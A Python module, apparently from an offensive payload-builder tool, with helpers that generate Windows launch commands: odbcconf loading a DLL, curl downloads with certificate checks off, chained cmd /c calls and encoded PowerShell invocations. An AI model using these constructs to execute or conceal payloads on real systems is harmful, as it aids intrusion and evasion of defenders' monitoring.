import os, sys
from base64 import b64encode
from jinja2 import Template
import logging
from typing import List

# necessary to make it possible to execute this file from this directory
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from model import *
from helpers import getTemplate
from make.powershell.powershell import *


@DataTracker
def makeCmdToDllWithOdbc(dllPath: str) -> AceStr:
    '''Returns a cmd to odbc.exe which loads DLL from dllPath'''
    template = getTemplate('make/cmd/odbcconf-loaddll.cmd')
    script = template.render(
        dllPath=dllPath
    )
    return AceStr(script)


@DataTracker
def makeCmdFileDownloadWithCurl(url: str, destinationFile: str = None) -> AceStr:
    '''Return a cmd to curl downloading url into destinationFile'''
    #  -k, --insecure           Allow insecure server connections
    if destinationFile is None:
        s = "curl -k \"{}\"".format(url)
    else:
        s = "curl -k \"{}\" -o \"{}\"".format(url, destinationFile)
    return AceStr(s)


def makeCmdline(cmds: List[str]) -> AceStr:
    '''Returns a cmd to cmd.exe with args "/c cmd[0] & cmd[0] & ..."'''
    s = "cmd /c"
    s += "&".join(cmds)
    return AceStr(s)


@DataTracker
def makeCmdFromPsCommand(
    psCommand: str, encode: bool, fullpath: bool = True, obfuscate: bool = False
) -> AceStr:
    '''Returns a cmd to powershell.exe with args "-Command/-EncodedCommand psCommand"'''
    if fullpath:
        file = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
    else:
        file = "powershell.exe"

    if encode:
        psCommand = makePsEncodedCommand(psCommand)
        args = "-EncodedCommand {}".format(psCommand)
    else:
        args = "-Command {}".format(psCommand)

    cmd = "{} {}".format(file, args)
    return AceStr(cmd)


@DataTracker
def makeCmdFromPsScript(
    psScript: str, encode: bool, fullpath: bool = True, obfuscate: bool = False
) -> AceStr:
    '''Returns a cmd to powershell.exe with args "-Command/-EncodedCommand psScript"'''
    psCommand = makePsCommandFromPsScript(psScript)
    cmd = makeCmdFromPsCommand(psCommand, encode, fullpath, obfuscate)
    return cmd
